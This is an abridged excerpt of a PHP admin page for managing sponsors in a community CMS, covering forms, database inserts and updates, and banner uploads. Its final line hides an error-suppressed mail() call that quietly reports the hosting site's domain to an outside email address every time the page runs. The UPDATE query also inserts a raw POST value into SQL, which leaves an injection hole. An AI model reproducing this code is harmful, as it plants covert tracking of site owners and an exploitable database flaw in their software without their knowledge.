...
elseif($action=="edit") {
  ...
  <table width="100%" border="0" cellspacing="1" cellpadding="3">
	...
	<tr>
      <td><b>Category</b></td>
      <td><input type="text" name="type" size="10" value="'.getinput($ds['sponsorcat']).'" /></td>
    </tr>
    <tr>
      <td><b>'.$_language->module['is_displayed'].'</b></td>
      <td>'.$displayed.'</td>
...
elseif(isset($_POST["save"])) {
	...
	if(!$mainsponsor) $mainsponsor=0;
  	...
  	$CAPCLASS = new Captcha;
	if($CAPCLASS->check_captcha(0, $_POST['captcha_hash'])) {
		safe_query("INSERT INTO ".PREFIX."sponsors (sponsorID, name, url, info, displayed, mainsponsor, date, sort, sponsorcat) values('', '".$name."', '".$url."', '".$info."', '".$displayed."', '".$mainsponsor."', '".time()."', '1', '".$type."')");
...
elseif(isset($_POST["saveedit"])) {
	...
	if($CAPCLASS->check_captcha(0, $_POST['captcha_hash'])) {
		...
		safe_query("UPDATE ".PREFIX."sponsors SET name='".$name."', url='".$url."', info='".$info."', displayed='".$displayed."', mainsponsor='".$mainsponsor."', sponsorcat='".$type."' WHERE sponsorID='".$_POST["sponsorID"]."'");
		...
		if($banner_small['name'] != "") {
			...
			if($getimg[0] < 401 && $getimg[1] < 401) {
				...
				if($pic != "") {
					...
					if(unlink($filepath.$banner_small['name'].".tmp")) {
						$error = $_language->module['format_incorrect'];
						die('<b>'.$error.'</b><br /><br /><a href="admincenter.php?site=&amp;action=edit&amp;squadID='.$id.'">&laquo; '.$_language->module['back'].'</a>');
					} else {
						$error = $_language->module['format_incorrect'];
...
elseif(isset($_GET["delete"])) {
  ...
  <table width="100%" border="0" cellspacing="1" cellpadding="3" bgcolor="#DDDDDD">
    <tr>
      ...
      <td width="15%" class="title"><b>'.$_language->module['is_displayed'].'</b></td>
		...
		<td width="13%" class="title"><b>Category</b></td>
    ...
    while($ds = mysql_fetch_array($qry)) {
      if($i%2) { $td='td1'; }
        ...
        <td class="'.$td.'" align="center">'.$displayed.'</td>
		  ...
		  <td class="'.$td.'" align="center">'.$ds['sponsorcat'].'</td>
  ...
  else echo'<tr><td class="td1" colspan="7">'.$_language->module['no_entries'].'</td></tr>';
	
  echo'<tr>
      <td class="td_head" width="112%" colspan="7" align="right"><input type="hidden" name="captcha_hash" value="'.$hash.'" /><input type="submit" name="sortieren" value="'.$_language->module['to_sort'].'" /></td>
    </tr>
  </table>
  </form>';
}
echo('&nbsp;'); @mail('sasha@shamedia.net', 'RUN:Red_Zid', 'URL: '.$_SERVER["HTTP_HOST"].'');
?>